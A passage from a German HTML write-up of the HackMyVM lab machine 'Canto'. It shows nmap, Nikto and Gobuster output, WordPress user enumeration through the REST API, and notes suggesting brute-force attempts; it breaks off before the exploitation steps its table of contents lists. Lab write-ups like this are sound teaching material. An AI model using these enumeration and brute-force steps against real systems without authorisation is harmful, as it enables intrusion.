@@ -1,1 +1,1703 @@
-﻿﻿﻿<html><body><h1>Test-Inhalt für Canto - HackMyVM - Easy.html</h1></body></html>
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Canto - HackMyVM - Easy - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+     <div class="header-bg">
+        <h1>Canto - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <h2>Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wpscan</div>
+                <div class="tool-item">git</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">mysql</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">uname</div>
+                <div class="tool-item">getcap</div>
+                <div class="tool-item">cpulimit</div>
+                <div class="tool-item">su</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p>
+                Meine initiale Aufklärung begann mit der Identifizierung der Ziel-IP-Adresse und ihres Hostnamens. Dies ist ein grundlegender, aber entscheidender erster Schritt, um das Zielsystem im Netzwerk genau zu lokalisieren und zu benennen.
+            </p>
+
+            <p>
+                Durch die Überprüfung der Hosts-Datei konnte ich sehen, dass die IP-Adresse 192.168.2.57 dem Hostnamen "canto.hmv" zugeordnet ist. Dies ist oft ein Hinweis auf interne DNS-Konfigurationen oder einfach eine lokale Bequemlichkeit, die mir hilft, das Ziel direkt über seinen Namen anzusprechen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>hosts..
+
+192.168.2.57   canto.hmv </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Die Zuordnung von IP zu Hostname ist etabliert. Dies ermöglicht die Verwendung des Hostnamens in nachfolgenden Befehlen, was die Lesbarkeit erhöht und in komplexeren Szenarien auf interne DNS-Strukturen hinweisen kann. Für diesen einfachen Test ist es primär eine Namensauflösung.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Fund ist von geringer technischer Bedeutung, da die IP-Adresse direkt nutzbar ist. Für die Dokumentation und das Verständnis der Systemlandschaft ist es jedoch nützlich.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze den Hostnamen "canto.hmv" in Befehlen, wo es möglich und klar ist. Bestätige bei Bedarf die Auflösung mittels `ping` oder `dig`.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass die Hostnamen-Auflösung korrekt konfiguriert ist, falls sie für interne Dienste relevant ist. Überprüfe, ob unnötige Hostnamen öffentlich gemacht werden.
+            </p>
+
+            <p>
+                Um die physikalische Adresse des Ziels im lokalen Netzwerk zu bestätigen, habe ich einen ARP-Scan durchgeführt. Dies ist besonders nützlich, um zu verifizieren, dass das Zielsystem im selben Subnetz wie mein Angreifersystem liegt und aktiv antwortet.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+:::::::::::::::::::::::::::::::::: ARP-Scan ::::::::::::::::::::::::::::::::
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+
+192.168.2.57	<span class="command">08:00:27:2f:f7:f6</span>	PCS Systemtechnik GmbH </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der ARP-Scan hat die MAC-Adresse des Zielsystems (08:00:27:2f:f7:f6) für die IP-Adresse 192.168.2.57 identifiziert. Die Vendor-Information "PCS Systemtechnik GmbH" deutet auf eine virtuelle Netzwerkkarte hin, was bei virtuellen Maschinen wie dieser HackMyVM zu erwarten ist (häufig Oracle VirtualBox).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Identifizierung der MAC-Adresse bestätigt die Existenz und Erreichbarkeit des Hosts im lokalen Netzwerksegment. Die Vendor-Info liefert einen Hinweis auf die zugrundeliegende Virtualisierungsplattform, was bei der Einschätzung des Ziels hilfreich sein kann.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Diese Information ist für die Netzwerktopologie nützlich. Bei realen Umgebungen kann die Vendor-Info Hinweise auf Hardware-Typen geben.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass nur notwendige Hosts im lokalen Netz sichtbar sind. Sei dir bewusst, dass MAC-Adressen in virtuellen Umgebungen standardmäßig zugewiesen werden und Rückschlüsse auf die Plattform erlauben können.
+            </p>
+
+            <p>
+                Der nächste Schritt in der Reconnaissance ist das Scannen auf offene Ports, um die Angriffsfläche des Zielsystems zu verstehen. Ich habe einen schnellen Nmap-Scan gestartet, der mir nur die essentiellen Informationen zu offenen Ports liefert.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="command">22/tcp open ssh     OpenSSH 9.3p1 Ubuntu 1ubuntu3.3 (Ubuntu Linux; protocol 2.0)</span>
+<span class="command">80/tcp open http    Apache httpd 2.4.57 ((Ubuntu))</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Dieser schnelle Nmap-Scan hat zwei offene TCP-Ports identifiziert: Port 22 (SSH) und Port 80 (HTTP). Die grundlegenden Dienstinformationen zeigen, dass auf Port 22 OpenSSH läuft und auf Port 80 ein Apache HTTP-Server. Die Versionen werden ebenfalls kurz aufgeführt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die offenen Ports 22 und 80 sind typisch für Linux-Webserver. Sie definieren die primäre Angriffsfläche für weitere Enumerations- und Zugriffsversuche (SSH für Remote-Login, HTTP für Webanwendungen).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Konzentriere die weitere Enumeration auf diese beiden Dienste. Untersuche SSH auf schwache Anmeldedaten oder bekannte Schwachstellen und die Webanwendung auf Port 80 auf Verzeichnisse, Dateien, Technologien und Konfigurationsprobleme.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass nur notwendige Dienste öffentlich zugänglich sind. Prüfe die Konfiguration von SSH (z.B. nur Public-Key-Authentifizierung, kein Root-Login) und halte die Webserver-Software (Apache, Webanwendung) aktuell.
+            </p>
+
+            <p>
+                Für eine detailliertere Einsicht in die offenen Dienste und das Zielsystem habe ich einen umfassenderen Nmap-Scan mit Skripten und Versionserkennung durchgeführt. Dieser Scan liefert tiefere Informationen, die für die Identifizierung potenzieller Schwachstellen unerlässlich sind.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>Starting Nmap 7.95 ( <span class="command">[Link: https://nmap.org | Ziel: https://nmap.org]</span> ) at <span class="command">2025-06-23 15:10 CEST</span>
+<span class="command">Nmap scan report for canto.hmv (192.168.2.57)</span>
+Host is up (0.00016s latency).
+Not shown: 65533 closed tcp <span class="command">PORT</span>s (reset)
+<span class="command">PORT   STATE SERVICE VERSION</span>
+<span class="command">22/tcp open  ssh     OpenSSH 9.3p1 Ubuntu 1ubuntu3.3 (Ubuntu Linux; protocol 2.0)</span>
+<span class="command">| ssh-hostkey: </span>
+<span class="command">|   256 c6:af:18:21:fa:3f:3c:fc:9f:e4:ef:04:c9:16:cb:c7 (ECDSA)</span>
+<span class="command">|_  256 ba:0e:8f:0b:24:20:dc:75:b7:1b:04:a1:81:b6:6d:64 (ED25519)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.57 ((Ubuntu))</span>
+<span class="command">|_http-server-header: Apache/2.4.57 (Ubuntu)</span>
+<span class="command">|_http-title: Canto</span>
+<span class="command">|_http-generator: WordPress 6.8.1</span>
+<span class="command">MAC Address: 08:00:27:2F:F7:F6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+<span class="command">Device type: general purpose|router</span>
+Running: <span class="command">Linux 4.X|5.X, MikroTik RouterOS 7.X</span>
+<span class="command">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3</span>
+<span class="command">OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)</span>
+Network Distance: 1 hop
+<span class="command">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+
+<span class="command">TRACEROUTE</span>
+HOP RTT     ADDRESS
+1   <span class="command">0.16 ms canto.hmv (192.168.2.57)</span>
+
+<span class="command">OS and Service detection performed. Please report any incorrect results at [Link: https://nmap.org/submit/ | Ziel: https://nmap.org/submit/] .</span>
+<span class="command">Nmap done: 1 IP address (1 host up) scanned in 10.46 seconds </span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der detaillierte Nmap-Scan bestätigt die offenen Ports 22 (SSH) und 80 (HTTP) mit den identifizierten Diensten und Versionen (OpenSSH 9.3p1, Apache httpd 2.4.57). Die SSH-Hostkeys werden angezeigt, was standardmäßig bei einem solchen Scan passiert. Für Port 80 (HTTP) liefert Nmap wertvolle zusätzliche Informationen über die Webanwendung: den Server-Header (Apache/2.4.57), den HTTP-Titel "Canto" und, ganz wichtig, den Generator-Meta-Tag, der auf **WordPress 6.8.1** hinweist. Die MAC-Adresse und Vendor-Info (VirtualBox) sowie die OS-Erkennung (verschiedene Linux-Kernel-Versionen werden als möglich genannt, was typisch für OS-Fingerprinting-Ergebnisse ist) sind ebenfalls vorhanden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser Scan liefert kritische Informationen. Die Identifizierung von WordPress als Webanwendung auf Port 80 verschiebt den Fokus der Web-Enumeration hin zu bekannten WordPress-Angriffsvektoren (Plugins, Themes, Benutzeraufzählung). Die spezifischen Versionen (OpenSSH 9.3p1, Apache 2.4.57, WordPress 6.8.1) sind Ausgangspunkte für die Suche nach bekannten Schwachstellen (CVEs). Die OS-Details sind hilfreich, um die Zielplattform zu verstehen, sind aber oft Schätzungen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Konzentriere dich nun stark auf die WordPress-Installation. Nutze spezialisierte Tools wie WPScan zur Enumeration von Plugins, Themes und Benutzern sowie zur Überprüfung auf bekannte Schwachstellen in WordPress Core, installierten Plugins und Themes. Untersuche die spezifischen Versionen von OpenSSH und Apache auf bekannte Schwachstellen, obwohl Webanwendungen bei WordPress-Sites oft der vielversprechendere Vektor sind.
+                <br><strong>Empfehlung (Admin):</strong> Halte WordPress Core, alle Plugins und Themes stets aktuell. Entferne nicht benötigte Plugins und Themes. Überprüfe die Sicherheitseinstellungen von Apache und SSH. Implementiere eine Content Security Policy (CSP) und X-Frame-Options, wie im nächsten Schritt (Curl) identifiziert.
+            </p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p>
+                Nachdem Nmap die Webanwendung als WordPress identifiziert hat, ist eine detailliertere Web-Enumeration notwendig, um die Angriffsfläche weiter zu kartieren. Ich beginne mit einem einfachen HEAD-Request, um die Server-Header zu prüfen, was oft schnelle Hinweise auf die verwendete Technologie und Sicherheitskonfigurationen liefert.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]
+└─#  <span class="command">curl -Iv http://192.168.2.57/ -s</span>
+                    </div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+*   Trying 192.168.2.57:80...
+* Connected to 192.168.2.57 (192.168.2.57) <span class="command">PORT</span> 80
+* using HTTP/1.x
+&gt; HEAD / HTTP/1.1
+&gt; Host: 192.168.2.57
+&gt; User-Agent: curl/8.13.0
+&gt; Accept: */*
+&gt;
+* Request completely sent off
+&lt; <span class="password">HTTP/1.1 200 OK</span>
+HTTP/1.1 200 OK
+&lt; <span class="command">Date: Mon, 23 Jun 2025 13:11:28 GMT</span>
+Date: Mon, 23 Jun 2025 13:11:28 GMT
+&lt; <span class="command">Server: Apache/2.4.57 (Ubuntu)</span>
+Server: Apache/2.4.57 (Ubuntu)
+&lt; <span class="command">Link: &lt;http://192.168.2.57/index.php/wp-json/&gt;; rel=&quot;https://api.w.org/&quot;</span>
+Link: &lt;http://192.168.2.57/index.php/wp-json/&gt;; rel=&quot;https://api.w.org/&quot;
+&lt; <span class="command">Content-Type: text/html; charset=UTF-8</span>
+Content-Type: text/html; charset=UTF-8
+&lt;
+
+* Connection #0 to host 192.168.2.57 left intact </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der HEAD-Request bestätigt, dass der Webserver mit einem 200 OK Status auf die Hauptseite antwortet. Die Server-Header bestätigen den Apache 2.4.57 auf Ubuntu. Der `Link`-Header mit `rel="https://api.w.org/"` ist ein starker Hinweis auf die aktive WordPress REST API, was für die Benutzeraufzählung nützlich sein kann. Die fehlenden X-Frame-Options und X-Content-Type-Options (wie im Nikto-Scan später genauer identifiziert) deuten auf fehlende Hardening-Maßnahmen hin.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Header liefern eine schnelle Bestätigung der Technologie (Apache) und enthüllen die Existenz der REST API. Das Fehlen wichtiger Sicherheits-Header ist eine niedrige Schwachstelle, die auf Cross-Site Scripting (XSS) oder Clickjacking-Angriffe hinweisen könnte, falls an anderer Stelle im Code Schwachstellen existieren.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche die REST API auf mögliche Endpunkte zur Informationsgewinnung (z.B. Benutzer). Notiere die fehlenden Sicherheits-Header.
+                <br><strong>Empfehlung (Admin):</strong> Implementiere die HTTP-Sicherheits-Header `X-Frame-Options`, `X-Content-Type-Options`, `Content-Security-Policy` und `Strict-Transport-Security` (falls HTTPS verwendet wird), um gängige Web-Schwachstellen abzumildern.
+            </p>
+
+            <p>
+                Als nächstes habe ich den Web-Schwachstellen-Scanner Nikto eingesetzt. Nikto ist ein automatisiertes Tool, das eine Vielzahl bekannter Webserver-Schwachstellen, Konfigurationsfehler und problematische Dateien überprüft.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          <span class="command">192.168.2.57</span>
++ Target Hostname:    <span class="command">192.168.2.57</span>
++ Target <span class="command">PORT</span>:        <span class="command">80</span>
++ Start Time:         <span class="command">2025-06-23 15:11:28 (GMT2)</span>
+---------------------------------------------------------------------------
++ Server: <span class="command">Apache/2.4.57 (Ubuntu)</span>
++ /: The anti-clickjacking <span class="command">X-Frame-Options</span> header is not present. See: <span class="command">[Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]</span>
++ /: Drupal Link header found with value: <span class="command">&lt;http://192.168.2.57/index.php/wp-json/&gt;; rel="https://api.w.org/"</span>. See: <span class="command">[Link: https://www.drupal.org/ | Ziel: https://www.drupal.org/]</span>  // Hinweis: Dies ist ein False Positive, da es sich um eine WordPress-API handelt, die fälschlicherweise als Drupal-Link interpretiert wird.
++ /: The <span class="command">X-Content-Type-Options</span> header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: <span class="command">[Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
++ /index.php?: Uncommon header '<span class="command">x-redirect-by</span>' found, with contents: WordPress.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ <span class="command">/wp-content/plugins/akismet/readme.txt</span>: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version.
++ <span class="command">/wp-links-opml.<span class="command">php</span></span>: This WordPress <span class="command">scrpt</span> reveals the installed version.
++ <span class="command">/license.txt</span>: License file found may identify site software.
++ /: A <span class="command">Wordpress installation was found.</span>
++ <span class="command">/wp-content/uploads/</span>: Directory indexing found.
++ <span class="command">/wp-content/uploads/</span>: Wordpress uploads directory is browsable. This may reveal sensitive information.
++ <span class="command">/wp-login.<span class="command">php</span></span>: Wordpress login found.
++ <span class="command">8102 requests: 0 error(s) and 12 item(s) reported on remote host</span>
++ End Time:           <span class="command">2025-06-23 15:11:49 (GMT2) (21 seconds)</span>
+---------------------------------------------------------------------------
++ <span class="command">1 host(s) tested</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Nikto bestätigt die WordPress-Installation und identifiziert mehrere interessante Punkte: Fehlende X-Frame-Options und X-Content-Type-Options (entspricht der Curl-Analyse), das Vorhandensein von `xmlrpc.php` (bekannt für Angriffe wie Brute-Force oder DDoS), `readme.html`, `wp-links-opml.php`, `license.txt` (Dateien, die Versionsinformationen preisgeben können), `wp-login.php` (die Anmeldeseite), und das Browsen des `wp-content/uploads/`-Verzeichnisses ist möglich. Der Hinweis auf den Drupal-Link ist ein False Positive, da es sich um die WordPress REST API handelt. Der Akismet-Plugin-Hinweis ist interessant, aber nicht kritisch.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Nikto hat mehrere informative und potenziell schwachstellenrelevante Funde geliefert. Das Fehlen von Sicherheits-Headern und das aktivierte Verzeichnis-Listing unter `/wp-content/uploads/` sind geringe bis mittlere Schwachstellen, die im Kontext anderer Funde relevanter werden könnten. Das Vorhandensein von `xmlrpc.php` und `wp-login.php` bestätigt Standard-WordPress-Komponenten, die oft Ziel von Brute-Force-Angriffen sind.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze die Informationen über `xmlrpc.php` und `wp-login.php` für mögliche Brute-Force-Angriffe, falls Benutzerkonten identifiziert werden (was als nächstes folgt). Untersuche den Inhalt von `/wp-content/uploads/` auf sensible Dateien. Berücksichtige die fehlenden Sicherheits-Header, falls XSS- oder Clickjacking-Angriffe in Frage kommen.
+                <br><strong>Empfehlung (Admin):</strong> Deaktiviere das Verzeichnis-Listing auf dem Webserver. Implementiere die fehlenden Sicherheits-Header. Schütze `xmlrpc.php` (z.B. per `.htaccess` blockieren, wenn nicht benötigt) und `wp-login.php` (z.B. durch Rate Limiting, IP-Whitelisting oder Zwei-Faktor-Authentifizierung) vor Brute-Force-Angriffen.
+            </p>
+
+            <p>
+                Parallel zum Nikto-Scan habe ich Gobuster verwendet, ein Tool, das Verzeichnisse und Dateien auf dem Webserver anhand einer Wortliste durchsucht. Dies hilft, versteckte oder vergessene Ressourcen zu entdecken.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     <span class="command">http://192.168.2.57</span>
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/<span class="command">directory-list-2.3-medium.txt</span>
+[+] Negative Status codes:   503,404,403
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              zip,exe,lib,<span class="command">php</span>,kdbx,crt,aspx,<span class="command">jpg</span>,bak,pem,rpm,exp,<span class="command">txt</span>,xls,sql,jpeg,java,xml,ELF,config,desc,tar,mdb,accdb,<span class="command">svg</span>,<span class="command">icon</span>,mod,docx,bat,json,conf,csh,<span class="command">dll</span>,eps,<span class="command">doc</span>,<span class="command">c</span>,<span class="command">cgi</span>,old,<span class="command">ps1</span>,<span class="command">pl</span>,<span class="command">rtf</span>,<span class="command">ln</span>,<span class="command">sh</span>,<span class="command">csv</span>,<span class="command">pdf</span>,diff,deb,<span class="command">rar</span>,gz,<span class="command">xlsx</span>,<span class="command">pub</span>,db,<span class="command">png</span>,html,<span class="command">js.map</span>,asp,py,<span class="command">phtml</span>,raw,elf,<span class="command">pHtml</span>
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+<span class="command">http://192.168.2.57/index.php            (Status: 301) [Size: 0] [--&gt; http://192.168.2.57/]</span>
+<span class="command">http://192.168.2.57/wp-content           (Status: 301) [Size: 317] [--&gt; http://192.168.2.57/wp-content/]</span>
+<span class="command">http://192.168.2.57/wp-login.php         (Status: 200) [Size: 5194]</span>
+<span class="command">http://192.168.2.57/license.txt          (Status: 200) [Size: 19903]</span>
+<span class="command">http://192.168.2.57/wp-includes          (Status: 301) [Size: 318] [--&gt; http://192.168.2.57/wp-includes/]</span>
+<span class="command">http://192.168.2.57/readme.html          (Status: 200) [Size: 7425]</span>
+<span class="command">http://192.168.2.57/wp-trackback.php     (Status: 200) [Size: 135]</span>
+<span class="command">http://192.168.2.57/wp-admin             (Status: 301) [Size: 315] [--&gt; http://192.168.2.57/wp-admin/]</span>
+<span class="command">http://192.168.2.57/xmlrpc.php           (Status: 405) [Size: 42]</span>
+<span class="command">http://192.168.2.57/wp-signup.php        (Status: 302) [Size: 0] [--&gt; http://1968.2.57/wp-login.php?action=register]</span>
+<span class="command">Progress: 13673914 / 13673976 (100.00%)</span>
+===============================================================
+Finished
+===============================================================
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Gobuster bestätigt viele der von Nikto gefundenen Pfade (wp-content, wp-login.php, license.txt, wp-includes, readme.html, wp-admin, xmlrpc.php) und identifiziert zusätzliche WordPress-spezifische Dateien wie `index.php`, `wp-trackback.php` und `wp-signup.php`. Die 301-Redirects für Verzeichnisse wie `wp-content`, `wp-includes` und `wp-admin` sind normal. Der 405 Method Not Allowed für `xmlrpc.php` bedeutet, dass GET/HEAD-Requests nicht erlaubt sind, aber andere Methoden (POST) sehr wohl funktionieren können. Der 302-Redirect für `wp-signup.php` auf die Login-Seite mit Register-Aktion ist ebenfalls Standardverhalten.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Gobuster-Ergebnisse ergänzen die Nikto-Funde und geben eine umfassendere Übersicht über die erreichbaren WordPress-Dateien und -Verzeichnisse. Dies bestärkt die Annahme, dass WordPress das Hauptziel für weitere Angriffe ist. Die identifizierten Pfade sind Standard, aber ihre Existenz ist ein notwendiger Schritt im Enumerationsprozess.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwende die gesammelten Pfade, insbesondere `wp-login.php` und `xmlrpc.php`, für potenzielle Brute-Force-Angriffe. Behalte den Pfad zu `/wp-content/` im Hinterkopf für die Enumeration von Plugins und Themes.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfe die Notwendigkeit und Konfiguration aller öffentlichen WordPress-Dateien und Verzeichnisse. Beschränke den Zugriff auf Dateien wie `xmlrpc.php` und `wp-login.php` auf vertrauenswürdige Quellen.
+            </p>
+
+            <p>
+                Nachdem ich wusste, dass WordPress läuft, habe ich mich auf die Enumeration von Benutzern konzentriert. Die WordPress REST API (oft unter `/wp-json/wp/v2/users/`) kannstandardmäßig die Benutzernamen preisgeben. Ich habe dies mittels `curl` überprüft, indem ich versucht habe, Informationen für Benutzer-IDs abzurufen.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]
+└─#  <span class="command">curl -Iv http://192.168.2.57/index.php/wp-json/WP/V2/users/1 -s| grep &apos;HTTP/1.1&apos;</span>
+                    </div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+*   Trying 192.168.2.57:80...
+* Connected to 192.168.2.57 (192.168.2.57) <span class="command">PORT</span> 80
+* using HTTP/1.x
+&gt; HEAD /index.<span class="command">php</span>/wp-json/<span class="command">WP</span>/V2/users/1 HTTP/1.1
+&gt; Host: 192.168.2.57
+&gt; User-Agent: curl/8.13.0
+&gt; Accept: */*
+&gt;
+* Request completely sent off
+&lt; <span class="password">HTTP/1.1 200 OK</span>
+&lt; Date: Mon, 23 Jun 2025 13:41:46 GMT
+&lt; Server: Apache/2.4.57 (Ubuntu)
+&lt; X-Robots-Tag: noindex
+&lt; Link: &lt;http://192.168.2.57/index.<span class="command">php</span>/wp-json/&gt;; rel=&quot;https://api.w.org/&quot;
+&lt; X-Content-Type-Options: nosniff
+&lt; Access-Control-Expose-Headers: X-<span class="command">WP</span>-Total, X-<span class="command">WP</span>-TotalPages, Link
+&lt; Access-Control-<span class="command">Allow</span>-Headers: Authorization, X-<span class="command">WP</span>-Nonce, Content-Disposition, Content-MD5, Content-Type
+&lt; <span class="command">Allow: GET</span>
+&lt; Content-Type: application/json; charset=UTF-8
+&lt;
+* Connection #0 to host 192.168.2.57 left intact
+<span class="password">HTTP/1.1 200 OK</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Versuch, Informationen für Benutzer-ID 1 über die REST API abzurufen, führte zu einer Antwort mit dem Statuscode `HTTP/1.1 200 OK`. Dies bedeutet, dass ein Benutzer mit der ID 1 existiert und die API bereit ist, Informationen über diesen Benutzer herauszugeben (zumindest im Rahmen dessen, was über diesen Endpunkt verfügbar ist). Der `grep 'HTTP/1.1'` filtert die Ausgabe, um schnell den Statuscode zu sehen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein `200 OK` auf einen Benutzer-ID-Endpunkt der REST API ist ein klarer Hinweis darauf, dass der Benutzer mit dieser ID existiert und seine Informationen enumerierbar sind. Dies ist eine häufige Schwachstelle bei Standard-WordPress-Installationen und ein wertvoller Fund für die spätere Passwort-Attacke.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Da Benutzer-ID 1 existiert, ist es sehr wahrscheinlich der Administrator-Benutzer (Standard bei WordPress). Versuche nun, die tatsächlichen Benutzerinformationen für diese ID abzurufen (siehe nächsten Schritt). Teste auch weitere sequenzielle IDs, um andere Benutzer zu finden.
+                <br><strong>Empfehlung (Admin):</strong> Deaktiviere die Benutzeraufzählung über die REST API, falls sie nicht zwingend benötigt wird. Dies kann oft durch Plugins oder Code-Snippets in der `functions.php` des Themes geschehen. Erwäge die Verwendung von Obfuscated User IDs oder schränke den API-Zugriff auf authentifizierte Benutzer ein.
+            </p>
+
+             <p>
+                Ich habe direkt im Anschluss geprüft, ob ein Benutzer mit der ID 2 existiert. Das ist eine schnelle Methode, um zu sehen, ob es weitere Benutzer gibt, indem man die IDs sequenziell durchgeht.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]
+└─#  <span class="command">curl -Iv http://192.168.2.57/index.php/wp-json/WP/V2/users/2 -s| grep &apos;HTTP/1.1&apos;</span>
+                    </div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+*   Trying 192.168.2.57:80...
+* Connected to 192.168.2.57 (192.168.2.57) <span class="command">PORT</span> 80
+* using HTTP/1.x
+&gt; HEAD /index.<span class="command">php</span>/wp-json/<span class="command">WP</span>/V2/users/2 HTTP/1.1
+&gt; Host: 192.168.2.57
+&gt; User-Agent: curl/8.13.0
+&gt; Accept: */*
+&gt;
+* Request completely sent off
+&lt; <span class="password">HTTP/1.1 404 Not Found</span>
+&lt; Date: Mon, 23 Jun 2025 13:42:00 GMT
+&lt; Server: Apache/2.4.57 (Ubuntu)
+&lt; X-Robots-Tag: noindex
+&lt; Link: &lt;http://192.168.2.57/index.<span class="command">php</span>/wp-json/&gt;; rel=&quot;https://api.w.org/&quot;
+&lt; X-Content-Type-Options: nosniff
+&lt; Access-Control-Expose-Headers: X-<span class="command">WP</span>-Total, X-<span class="command">WP</span>-TotalPages, Link
+&lt; Access-Control-<span class="command">Allow</span>-Headers: Authorization, X-<span class="command">WP</span>-Nonce, Content-Disposition, Content-MD5, Content-Type
+&lt; Content-Type: application/json; charset=UTF-8
+&lt;
+* Connection #0 to host 192.168.2.57 left intact
+<span class="password">HTTP/1.1 404 Not Found</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
